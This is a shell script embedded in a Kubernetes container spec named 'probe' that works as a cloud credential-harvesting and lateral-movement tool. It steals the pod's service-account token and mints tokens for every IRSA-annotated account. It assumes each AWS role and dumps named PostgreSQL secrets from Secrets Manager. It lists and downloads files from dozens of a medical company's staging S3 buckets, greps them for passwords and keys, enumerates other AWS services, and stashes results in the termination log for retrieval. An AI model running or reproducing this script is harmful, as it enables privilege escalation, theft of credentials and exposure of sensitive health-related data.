containers.name: probe
args:
#!/bin/sh
set -u
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
API=https://kubernetes.default.svc
get(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
post(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" --header="Content-Type: application/json" --post-data="$2" "$1" 2>/dev/null; }
SUM=/tmp/summary.txt
: > $SUM
echo "===I3359B_START env=stage utc=$(date -u +%FT%TZ)==="
apk add --no-cache aws-cli jq gzip >/tmp/apk.log 2>&1
echo "apk_rc=$? aws=$(aws --version 2>&1 | head -c 60)"
export AWS_DEFAULT_REGION=us-west-2

ALL=$(get "$API/api/v1/serviceaccounts")
echo "$ALL" | jq -r '.items[] | select(.metadata.annotations["eks.amazonaws.com/role-arn"] != null) | "\(.metadata.namespace) \(.metadata.name)"' > /tmp/sas.txt
echo "SA_TOTAL=$(wc -l < /tmp/sas.txt)"
cat /tmp/sas.txt
echo "SA_TOTAL=$(wc -l < /tmp/sas.txt)" >> $SUM

assume(){
  NS=$1; S=$2; SESS=$3
  SAJ=$(get "$API/api/v1/namespaces/$NS/serviceaccounts/$S")
  AR=$(echo "$SAJ" | jq -r '.metadata.annotations["eks.amazonaws.com/role-arn"] // empty')
  [ -z "$AR" ] && { echo "ROLE_NONE $NS/$S"; return 1; }
  TK=$(post "$API/api/v1/namespaces/$NS/serviceaccounts/$S/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
  WT=$(echo "$TK" | jq -r '.status.token // empty')
  [ -z "$WT" ] && { echo "TOKEN_FAIL $NS/$S"; return 1; }
  RES=$(aws sts assume-role-with-web-identity --role-arn "$AR" --role-session-name "$SESS" --web-identity-token "$WT" --duration-seconds 1800 --region us-west-2 --output json 2>&1)
  echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1 || { echo "ASSUME_FAIL $NS/$S $(echo "$RES"|head -c 160|tr '\n' ' ')"; return 1; }
  export AWS_ACCESS_KEY_ID=$(echo "$RES"|jq -r .Credentials.AccessKeyId)
  export AWS_SECRET_ACCESS_KEY=$(echo "$RES"|jq -r .Credentials.SecretAccessKey)
  export AWS_SESSION_TOKEN=$(echo "$RES"|jq -r .Credentials.SessionToken)
  CUR="$NS/$S"; echo "ASSUME_OK $NS/$S role=$AR"; return 0
}
unassume(){ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN; CUR=""; }
use(){ i=$1
  export AWS_ACCESS_KEY_ID=$(cat /tmp/ak$i 2>/dev/null)
  export AWS_SECRET_ACCESS_KEY=$(cat /tmp/sk$i 2>/dev/null)
  export AWS_SESSION_TOKEN=$(cat /tmp/st$i 2>/dev/null)
}
who(){ cat /tmp/who$1 2>/dev/null; }

# ---------- Phase0: assume all, identity, IAM ----------
i=0
NROLE=0
while read -r NS S; do
  i=$((i+1))
  if assume "$NS" "$S" "b$i"; then
    NROLE=$i
    echo "IDENT $NS/$S $(aws sts get-caller-identity --output json 2>&1 | tr '\n' ' ' | head -c 250)"
    RN=$(get "$API/api/v1/namespaces/$NS/serviceaccounts/$S" | jq -r '.metadata.annotations["eks.amazonaws.com/role-arn"] // empty' | awk -F/ '{print $NF}')
    echo "IAM_GETROLE $NS/$S $(aws iam get-role --role-name "$RN" --output json 2>&1 | head -c 500 | tr '\n' ' ')"
    echo "IAM_ATTACHED $NS/$S $(aws iam list-attached-role-policies --role-name "$RN" --output json 2>&1 | head -c 500 | tr '\n' ' ')"
    echo "IAM_INLINE $NS/$S $(aws iam list-role-policies --role-name "$RN" --output json 2>&1 | head -c 400 | tr '\n' ' ')"
    echo "$AWS_ACCESS_KEY_ID" > /tmp/ak$i
    echo "$AWS_SECRET_ACCESS_KEY" > /tmp/sk$i
    echo "$AWS_SESSION_TOKEN" > /tmp/st$i
    echo "$NS $S" > /tmp/who$i
    unassume
  fi
done < /tmp/sas.txt
echo "ROLES_CACHED=$NROLE"
echo "ASSUME_CACHED=$NROLE" >> $SUM

# ---------- PHASE SM ----------
echo "###PHASE_SM"
for ARN in lazamedical-dp-stage01-usw2-postgresql-db-secret-RhmCUf lazamedical-dp-stage01-usw2-postgresql-db1-secret-kNEmKZ; do
  OK=0
  j=0
  while read -r NS S; do
    j=$((j+1))
    assume "$NS" "$S" "sm$j" || continue
    V=$(aws secretsmanager get-secret-value --secret-id "$ARN" --query SecretString --output text --region us-west-2 2>/tmp/smerr.txt); RC=$?
    if [ $RC -eq 0 ]; then
      echo "SM_OK $ARN role=$NS/$S"
      echo "SMVAL $V" | head -c 12000; echo
      echo "SM_OK $ARN role=$NS/$S len=${#V}" >> $SUM
      OK=1; unassume; break
    else
      echo "SM_NO $ARN role=$NS/$S $(head -c 90 /tmp/smerr.txt | tr '\n' ' ')"
    fi
    unassume
  done < /tmp/sas.txt
  [ $OK -eq 0 ] && { echo "SM_NONE $ARN"; echo "SM_NONE $ARN" >> $SUM; }
done

# ---------- PHASE S3: per-bucket all-role ----------
echo "###PHASE_S3"
: > /tmp/allkeys.txt
: > /tmp/brolemap.txt
BOK=0; BNO=0
for B in lazamedical-dp-stage01-usw2-airflow-bucket lazamedical-dp-stage01-usw2-athena-bucket lazamedical-dp-stage01-usw2-cornerstone-viewer-remote-ui-bucket lazamedical-dp-stage01-usw2-data-management-portal-ui-bucket lazamedical-dp-stage01-usw2-dicom-structure-bucket lazamedical-dp-stage01-usw2-glue-asset-bucket lazamedical-dp-stage01-usw2-glue-crawler-s3-bucket lazamedical-dp-stage01-usw2-green-bucket lazamedical-dp-stage01-usw2-imednet-sync-bucket lazamedical-dp-stage01-usw2-imfusion-bucket lazamedical-dp-stage01-usw2-imfusion-viewer-remote-ui-bucket lazamedical-dp-stage01-usw2-ingestion-bucket lazamedical-dp-stage01-usw2-ingestion-failure-bucket lazamedical-dp-stage01-usw2-lambda-code-s3-bucket lazamedical-dp-stage01-usw2-lps-bucket lazamedical-dp-stage01-usw2-metadata-parquet-bucket lazamedical-dp-stage01-usw2-mlflow-artifact-storage lazamedical-dp-stage01-usw2-png-viewer-remote-ui-bucket lazamedical-dp-stage01-usw2-red-bucket lazamedical-dp-stage01-usw2-rekognition-s3-bucket lazamedical-dp-stage01-usw2-temp-dicom-csv-reports-storage lazamedical-dp-stage01-usw2-temp-dicom-frame-storage lazamedical-dp-stage01-usw2-temp-storage-bucket-name lazamedical-dp-stage01-usw2-yellow-bucket lazamedical-stage01-usw2-bastion-bucket lazamedical-stage01-usw2-cloudtrail-01-logs lazamedical-stage01-usw2-cloudtrail-02-logs lazamedical-stage01-usw2-dp-ingestion-bucket lazamedical-stage01-usw2-s3-bucket lazamedical-stage01-usw2-user-management-ui-bucket; do
  listed=0
  for i in $(seq 1 $NROLE); do
    use $i
    LO=$(aws s3api list-objects-v2 --bucket "$B" --max-keys 100 --no-paginate --region us-west-2 --output json 2>/tmp/loerr.txt); RC=$?
    unassume
    if [ $RC -eq 0 ]; then
      NN=$(echo "$LO"|jq '.Contents|length' 2>/dev/null); TR=$(echo "$LO"|jq -r '.IsTruncated' 2>/dev/null)
      echo "BKT_OK $B n=$NN trunc=$TR role=$(who $i)"
      echo "$LO" | jq -r --arg b "$B" '.Contents[]? | "\($b)\t\(.Size)\t\(.Key)"' >> /tmp/allkeys.txt
      echo "$B $i" >> /tmp/brolemap.txt
      listed=1; BOK=$((BOK+1)); break
    fi
  done
  if [ $listed -eq 0 ]; then
    echo "BKT_NO $B all_roles_denied $(head -c 110 /tmp/loerr.txt|tr '\n' ' ')"
    BNO=$((BNO+1))
  fi
done
echo "BKT_OK_TOTAL=$BOK BKT_NO_TOTAL=$BNO BKT_KEYS_TOTAL=$(wc -l < /tmp/allkeys.txt)"
echo "BKT_OK_TOTAL=$BOK BKT_NO_TOTAL=$BNO BKT_KEYS_TOTAL=$(wc -l < /tmp/allkeys.txt)" >> $SUM
# candidates
awk -F'\t' '{
  k=tolower($3); p=9;
  if (k ~ /(^|\/)(\.env|config|secret|credential|backup)/ || k ~ /\.(env|pem|sql|tfstate)$/) p=1;
  else if (k ~ /\.(json|ya?ml|ini|conf|properties|xml|txt)$/) p=2;
  if (p<9 && $2<1048576) print p"\t"$0
}' /tmp/allkeys.txt | sort -t'	' -k1,1n -k3,3n | cut -f2- > /tmp/cand.txt
echo "CAND_N=$(wc -l < /tmp/cand.txt)"
awk -F'\t' '{c[$1]++; if(c[$1]<=3 && n<30){print; n++}}' /tmp/cand.txt > /tmp/picked.txt
echo "PICKED_N=$(wc -l < /tmp/picked.txt)"
IDX=0; TOT=0
while IFS='	' read -r B SZ KEY; do
  [ -z "${B:-}" ] && continue
  IDX=$((IDX+1)); TOT=$((TOT+SZ))
  [ $TOT -gt 20971520 ] && { echo "CAP_BYTES"; break; }
  RI=$(awk -v b="$B" '$1==b{print $2; exit}' /tmp/brolemap.txt)
  echo "PICK $IDX bucket=$B size=$SZ key=$KEY"
  use ${RI:-1}
  aws s3api get-object --bucket "$B" --key "$KEY" /tmp/o$IDX.bin --region us-west-2 >/dev/null 2>/tmp/gerr.txt
  GRC=$?
  unassume
  echo "GET rc=$GRC bytes=$(wc -c < /tmp/o$IDX.bin 2>/dev/null || echo 0)"
  if [ $GRC -eq 0 ]; then
    if gzip -t /tmp/o$IDX.bin 2>/dev/null; then gzip -dc /tmp/o$IDX.bin > /tmp/o$IDX.txt 2>/dev/null; else cp /tmp/o$IDX.bin /tmp/o$IDX.txt; fi
    echo "SAMPLE $(head -c 160 /tmp/o$IDX.txt | tr '\n' ' ')"
    H=$(grep -aEic "password|passwd|secret|token|AKIA|ASIA|Bearer|SMTP|api[_-]?key|sk-|Authorization|client_secret|PRIVATE KEY|mysql://|postgres://|redis://|jdbc:" /tmp/o$IDX.txt 2>/dev/null)
    echo "HITS=$H"
    grep -aEi "password|passwd|secret|token|AKIA|ASIA|Bearer|SMTP|api[_-]?key|sk-|Authorization|client_secret|PRIVATE KEY|mysql://|postgres://|redis://|jdbc:" /tmp/o$IDX.txt 2>/dev/null | head -6 | cut -c1-300
    [ "$H" != "0" ] && echo "HITFILE $B/$KEY" >> $SUM
  else
    echo "GET_ERR $(head -c 120 /tmp/gerr.txt|tr '\n' ' ')"
  fi
done < /tmp/picked.txt

# ---------- PHASE SVC ----------
echo "###PHASE_SVC"
svc(){
  LBL=$1; shift
  LAST=""
  for i in $(seq 1 $NROLE); do
    use $i
    OUT=$("$@" 2>&1); RC=$?
    unassume
    if [ $RC -eq 0 ]; then
      echo "SVC_$LBL role=$(who $i) rc=0 $(echo "$OUT"|head -c 2000|tr '\n' ' ')"
      echo "SVC_$LBL OK $(who $i)" >> $SUM
      return 0
    fi
    LAST=$(echo "$OUT" | head -c 110 | tr '\n' ' ')
  done
  echo "SVC_$LBL NONE last=$LAST"
  echo "SVC_$LBL NONE" >> $SUM
}
svc SQS aws sqs list-queues
svc SNS aws sns list-topics
svc SESQ aws ses get-send-quota
svc SESID aws ses list-identities --max-items 20
svc KMS aws kms list-keys --limit 20
svc KMSAL aws kms list-aliases --limit 20
svc ECR aws ecr describe-repositories --max-items 20
svc LOGS aws logs describe-log-groups --limit 20
svc DDB aws dynamodb list-tables --limit 20
svc RDS aws rds describe-db-instances --max-items 5
svc RDSSNAP aws rds describe-db-snapshots --max-items 5
svc CF aws cloudfront list-public-keys --max-items 10
svc LAMBDA aws lambda list-functions --max-items 10
svc SMSEC aws secretsmanager list-secrets --max-items 20

echo "###PHASE_EKS"
for i in $(seq 1 $NROLE); do
  use $i
  EO=$(aws eks list-clusters --region us-west-2 --output json 2>&1); ERC=$?
  unassume
  if [ $ERC -eq 0 ]; then
    echo "EKS_CLUSTERS role=$(who $i) $(echo "$EO"|head -c 500|tr '\n' ' ')"
    echo "EKS_CLUSTERS OK $(who $i)" >> $SUM
    for C in $(echo "$EO"|jq -r '.clusters[]?' 2>/dev/null); do
      use $i
      echo "EKS_DESC $C role=$(who $i) $(aws eks describe-cluster --name "$C" --region us-west-2 --output json 2>&1 | head -c 1200 | tr '\n' ' ')"
      unassume
    done
    break
  fi
done
[ -z "${EO:-}" ] && echo "EKS_NONE"

echo "===I3359B_DONE $(date -u +%FT%TZ)==="
{ echo "I3359B env=stage done=$(date -u +%FT%TZ)"; cat $SUM; } 2>/dev/null | head -c 3900 > /dev/termination-log
